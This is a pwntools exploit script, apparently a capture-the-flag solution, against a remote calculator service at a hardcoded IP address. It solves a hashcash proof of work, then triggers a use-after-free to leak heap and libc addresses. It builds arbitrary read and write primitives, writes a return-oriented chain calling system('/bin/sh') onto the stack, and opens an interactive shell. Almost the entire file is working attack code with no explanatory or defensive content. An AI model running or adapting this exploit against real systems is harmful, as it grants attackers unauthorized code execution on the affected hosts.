#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import *
import subprocess

#p = process("./main")
#gdb.attach(p)
p = remote('47.91.241.202', 4279)
#p = remote('47.98.57.30', 4279)

c32 = lambda x: c_uint32(x).value
s32 = lambda x: c_int32(x).value
qword = lambda l,h: c32(l) + (c32(h) << 32)

def PoW(chal, bits=28):
    output = subprocess.check_output(["hashcash", "-m", "-b", str(bits), chal])
    work = output.lstrip("hashcash stamp: ")
    return work

chal = p.recvuntil('\n', drop=True).split()
nbits = int(chal[4])
chall = chal[5]
work = PoW(chall, nbits)
print work
p.recvuntil(':')
p.sendline(work)

def calc(x):
    p.recvuntil(">>> ")
    p.sendline(x)
    return

def store(yn='n'):
    p.recvuntil('(y/n): ')
    p.sendline(yn)
    return

def command(idx):
    p.recvuntil('$ ')
    p.sendline(str(idx))
    return

# fill the vector vec
calc(repr(8 * [1]))
for i in xrange(10):
    command(4)
command(0)
store()

# uaf caused by 'unwrap'
calc(repr(120 * [1]))
command(8)
p.recvuntil('=> ')
p.sendline('0')

def getnumber(idx):
    command(6)
    p.recvuntil('number: ')
    p.sendline(str(idx))
    p.recvuntil('Result: ')
    return int(p.recvuntil('\n', drop=True))

heap_addr = qword(getnumber(0), getnumber(1))
heap_base = heap_addr - 0x1e120
io_file = heap_base + 0x15000
log.info("Heap base = " + hex(heap_addr))

def setaddr(addr):
    command(7)
    p.recvuntil(" => ")
    p.sendline('0')
    p.recvuntil(" => ")
    p.sendline(str(s32(addr & 0xFFFFFFFF)))
    command(7)
    p.recvuntil(" => ")
    p.sendline('1')
    p.recvuntil(" => ")
    p.sendline(str(s32(addr >> 32)))
    return

def read64(addr):
    setaddr(addr)
    command(9)
    p.recvuntil("=>")
    p.sendline('0')
    p.recvuntil("=>")
    p.sendline('0')
    p.recvuntil("=>")
    p.sendline('119')
    low = getnumber(119)
    command(9)
    p.recvuntil("=>")
    p.sendline('0')
    p.recvuntil("=>")
    p.sendline('1')
    p.recvuntil("=>")
    p.sendline('119')
    hi = getnumber(119)
    return qword(c32(low), c32(hi))

vtable = read64(io_file + 0xd8)
func_addr = read64(vtable + 0x10)
libc = func_addr - 0x799c0
log.info("Libc = " + hex(libc))
environ = libc + 0x3c6f38
stack_addr = read64(environ) - 896 + 0x20
system = libc + 0x45390
binsh = libc + 0x18cd57
poprdi = libc + 0x0000000000021102
setaddr(stack_addr)
#print hex(stack_addr)
command(0)
store()

#raw_input()

# arb write
calc(str(0x13337))
def writes32(index, val):
    command(6)
    p.sendline(str(s32(val & 0xFFFFFFFF)))
    command(5)
    command(9)
    p.recvuntil("=>")
    p.sendline(str(0))
    p.recvuntil("=>")
    p.sendline(str(index))
    return

def writes64(index, val):
    writes32(index, val & 0xFFFFFFFF)
    writes32(index + 1, val >> 32)
    return

writes64(0, poprdi)
writes64(2, binsh)
writes64(4, system)
command(0)
store()


# pop shell
calc("exit")

p.interactive()
